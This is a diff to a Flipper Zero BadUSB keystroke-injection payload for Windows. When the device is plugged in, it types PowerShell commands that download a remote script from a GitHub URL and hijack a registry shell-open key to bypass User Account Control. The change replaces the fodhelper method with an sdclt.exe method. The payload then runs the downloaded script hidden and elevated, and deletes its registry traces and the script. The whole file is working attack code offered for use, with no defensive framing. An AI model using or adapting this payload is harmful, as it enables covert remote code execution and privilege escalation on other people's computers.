@@ -1,5 +1,5 @@
 REM Simple and Robust BadUSB Payload for Flipper Zero
-REM Opens admin PowerShell and runs script with UAC bypass, split into multiple commands for reliability
+REM Opens admin PowerShell and runs script with UAC bypass using sdclt.exe, split into multiple commands for reliability
 
 DELAY 2000
 GUI x
@@ -13,22 +13,22 @@ DELAY 2000
 STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'"
 ENTER
 DELAY 2000
-STRING powershell -Command "New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force"
+STRING powershell -Command "New-Item -Path HKCU:\Software\Classes\Folder\shell\open\command -Force"
 ENTER
 DELAY 1000
-STRING powershell -Command "Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force"
+STRING powershell -Command "Set-ItemProperty -Path HKCU:\Software\Classes\Folder\shell\open\command -Name DelegateExecute -Value '' -Force"
 ENTER
 DELAY 1000
-STRING powershell -Command "Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1'' -WindowStyle Hidden' -Force"
+STRING powershell -Command "Set-ItemProperty -Path HKCU:\Software\Classes\Folder\shell\open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1'' -WindowStyle Hidden' -Force"
 ENTER
 DELAY 1000
-STRING powershell -Command "Start-Process 'C:\Windows\System32\fodhelper.exe'"
+STRING powershell -Command "Start-Process 'C:\Windows\System32\sdclt.exe'"
 ENTER
 DELAY 15000
-STRING powershell -Command "Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force"
+STRING powershell -Command "Remove-ItemProperty -Path HKCU:\Software\Classes\Folder\shell\open\command -Name DelegateExecute -Force"
 ENTER
 DELAY 1000
-STRING powershell -Command "Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force"
+STRING powershell -Command "Remove-ItemProperty -Path HKCU:\Software\Classes\Folder\shell\open\command -Name '(default)' -Force"
 ENTER
 DELAY 1000
 STRING powershell -Command "Remove-Item 'C:\temp\badkb.ps1' -Force"
